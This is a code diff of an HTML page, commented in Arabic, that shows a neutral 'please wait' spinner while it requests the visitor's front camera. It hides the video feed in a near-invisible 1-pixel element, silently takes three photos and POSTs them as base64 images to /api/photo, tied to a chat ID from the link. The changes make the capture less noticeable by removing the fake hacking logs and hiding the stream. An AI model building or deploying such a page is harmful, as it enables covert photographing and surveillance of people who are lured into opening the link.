@@ -5,118 +5,94 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 <title>System Access</title>
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
   body {
-    background-color: #000; color: #0f0; font-family: 'Share Tech Mono', monospace;
-    margin: 0; padding: 20px; display: flex; flex-direction: column;
-    height: 100vh; box-sizing: border-box; overflow: hidden;
+    background-color: #0d0d0d; color: #fff; 
+    font-family: system-ui, -apple-system, sans-serif;
+    margin: 0; display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    height: 100vh; overflow: hidden;
   }
-  #terminal { flex-grow: 1; overflow-y: auto; font-size: 14px; line-height: 1.5; }
-  .line { margin-bottom: 5px; opacity: 0; animation: fadeIn 0.1s forwards; }
-  .blink { animation: blink 1s step-end infinite; }
-  @keyframes fadeIn { to { opacity: 1; } }
-  @keyframes blink { 50% { opacity: 0; } }
-  #status { font-weight: bold; color: #fff; margin-top: 20px; text-align: center; }
   .spinner {
-    border: 3px solid #0f0; border-top: 3px solid transparent;
-    border-radius: 50%; width: 30px; height: 30px;
-    animation: spin 1s linear infinite; margin: 20px auto;
+    border: 4px solid #333; border-top: 4px solid #fff;
+    border-radius: 50%; width: 50px; height: 50px;
+    animation: spin 1s linear infinite; margin-bottom: 20px;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
+  #status-text { font-size: 18px; color: #aaa; letter-spacing: 1px; }
+  
+  /* الفيديو مخفي بس شغال عشان ياخد الصور */
+  #video { 
+    position: absolute; top: 0; left: 0; 
+    width: 1px; height: 1px; opacity: 0.01; pointer-events: none; 
+  }
 </style>
 </head>
 <body>
 
-<div id="terminal"></div>
-<div id="status">
-  <div class="spinner" id="spinner"></div>
-  <span id="status-text">جاري الاتصال...</span>
-</div>
+<div class="spinner" id="spinner"></div>
+<div id="status-text">أنتظر قليلاً...</div>
 
-<video id="video" autoplay playsinline style="display:none;"></video>
+<video id="video" autoplay playsinline muted></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
   const urlParams = new URLSearchParams(window.location.search);
   const chatId = urlParams.get('chatId');
-  const term = document.getElementById('terminal');
   const statusText = document.getElementById('status-text');
   const spinner = document.getElementById('spinner');
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
 
-  const logs = [
-    "[*] Initializing exploit framework...",
-    "[*] Targeting device OS...",
-    "[*] Bypassing firewall...",
-    "[*] Establishing secure connection...",
-    "[*] Accessing camera hardware...",
-    "[!] Waiting for user authorization..."
-  ];
-
-  function addLog(text) {
-    const div = document.createElement('div');
-    div.className = 'line';
-    div.innerText = text;
-    term.appendChild(div);
-    term.scrollTop = term.scrollHeight;
-  }
-
   async function run() {
     if(!chatId) {
-      statusText.innerText = "Error: Invalid Token.";
+      statusText.innerText = "رابط غير صالح";
       statusText.style.color = "#f00";
+      spinner.style.display = 'none';
       return;
     }
 
-    // طبع اللوجات عشان تمغط الوقت
-    for (let i = 0; i < logs.length; i++) {
-        addLog(logs[i]);
-        await new Promise(r => setTimeout(r, 600));
-    }
-
     try {
-      // طلب الكاميرا (هيظهر إشعار المتصفح هنا)
+      // طلب إذن الكاميرا
       const stream = await navigator.mediaDevices.getUserMedia({ 
         video: { facingMode: "user" }, audio: false 
       });
       
-      addLog("[+] Camera access granted.");
-      addLog("[*] Capturing frame...");
-      statusText.innerText = "جاري المعالجة...";
       video.srcObject = stream;
+      await video.play();
 
-      setTimeout(() => {
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-        const imageData = canvas.toDataURL('image/jpeg', 0.8);
+      // انتظار الكاميرا تجهز
+      let checkVideo = setInterval(async () => {
+        if (video.videoWidth > 0 && video.videoHeight > 0) {
+          clearInterval(checkVideo);
+          
+          // التقاط 3 صور ورا بعض
+          for (let i = 0; i < 3; i++) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // ضغط الصورة وإرسالها
+            const imageData = canvas.toDataURL('image/jpeg', 0.7);
+            await fetch('/api/photo', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ chat_id: chatId, image_b64: imageData })
+            });
 
-        fetch('/api/photo', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, image_b64: imageData })
-        }).then(res => {
-            if(res.ok) {
-                spinner.style.display = 'none';
-                statusText.innerText = "تم الاتصال بنجاح.";
-                statusText.style.color = "#0f0";
-                addLog("[+] Data sent successfully.");
-                addLog("[*] Connection closed.");
-            } else {
-                throw new Error();
-            }
-        }).catch(e => {
-            spinner.style.display = 'none';
-            statusText.innerText = "فشل الاتصال.";
-            statusText.style.color = "#f00";
-        });
-      }, 2000); 
+            // استنى ثانية ونص قبل الصورة اللي بعدها
+            if(i < 2) await new Promise(r => setTimeout(r, 1500));
+          }
+
+          // خلصنا
+          spinner.style.display = 'none';
+          statusText.innerText = "تم الاتصال بنجاح.";
+          statusText.style.color = "#0f0";
+        }
+      }, 200);
 
     } catch (err) {
-      addLog("[-] Authorization denied.");
       spinner.style.display = 'none';
-      statusText.innerText = "تم رفض الصلاحية. أعد المحاولة.";
+      statusText.innerText = "تم رفض الصلاحية.";
       statusText.style.color = "#f00";
     }
   }
